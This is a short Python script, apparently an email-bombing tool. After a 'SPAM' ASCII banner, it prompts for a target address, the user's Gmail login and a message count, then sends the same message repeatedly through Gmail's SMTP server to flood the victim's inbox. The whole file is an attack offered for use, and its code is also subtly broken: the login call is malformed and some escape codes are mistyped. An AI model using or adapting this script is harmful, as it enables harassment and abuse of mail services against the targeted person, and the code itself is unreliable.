import smtplib
import time

#print ("\033[1;31m_________   __	    __        ____         ________    __
print ("\033[1:34m|########| |##\	   /##|		 /####\		  |########|  |##| 		 							\033[1;m")
print ("\033[1:34m|##|_____  |###\ __ /###|		/##/\##\		 |##|	  |##|									\033[1;m")
print ("\033[1:34m|########| |##| |##| |##|	   /########\		 |##|     |##|		   SPAMMMMMMMMMMMMMMMMMMMM  \033[1;m")
print ("\033[1:34m|##|______ |##|	   |##|   /##/    \##\	   __|##|__	  |##|_____	   SPAMMMMMMMMMMMMMMMMMMMM  \033[1;m")
print ("\033[1:34m|########| |##|	   |##|  /##/      \##\	  |########|  |########|   SPAMMMMMMMMMMMMMMMMMMMM  \033[1;m")

try:
	bomb_email = input("Enter e-mail adress on whom you want to perform the attack: ")
	email = input("Enter you e-mail adress: ")
	password = input("Enter your e-mail password: ")
	message = input("Enter Message: ")
	counter = int(input("How many messages do you want to send?"))

	for x in range(0,counter):
		print("Number of Message sent: ", x+1)
		mail = smtplib.SMTP('smtp.gmail.com',587)
		mail.ehlo()
		mail.starttls()
		mail.login(email.password)
		mail.sendmail(email,bomb_email,message)
		time.sleep(1)
	mail.close()

except Exception as e:
	print(e);
	print("Something is wrong , please Re-try again with vaild input.")

